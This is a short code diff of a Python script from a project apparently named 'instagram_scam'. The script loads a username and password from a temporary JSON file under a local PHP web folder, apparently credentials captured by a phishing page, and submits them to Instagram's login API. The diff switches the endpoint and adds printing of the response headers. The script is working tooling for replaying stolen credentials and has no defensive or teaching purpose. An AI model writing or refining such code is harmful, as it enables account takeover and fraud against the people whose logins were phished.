@@ -2,8 +2,8 @@ import requests
 import json
 import datetime
 
-with open('C:/xampp/htdocs/instagram_scam/php/login_tmp.json','r') as file:   
-   login = json.load(file) 
+with open('C:/xampp/htdocs/instagram_scam/php/login_tmp.json','r') as file:
+   login = json.load(file)
 
 username = login['username']
 password = login['password']
@@ -44,7 +44,13 @@ data = {
     'queryParams': '{}',
     'trustedDeviceRecords': '{}',
     'username': username,
+
 }
 
-response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
-print(response.text)
+response = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=data)
+res = response.headers
+res = json.dumps(dict(res))
+print (response.text)
+print(res)
+
+#print (json.dumps(dict(response.headers)))
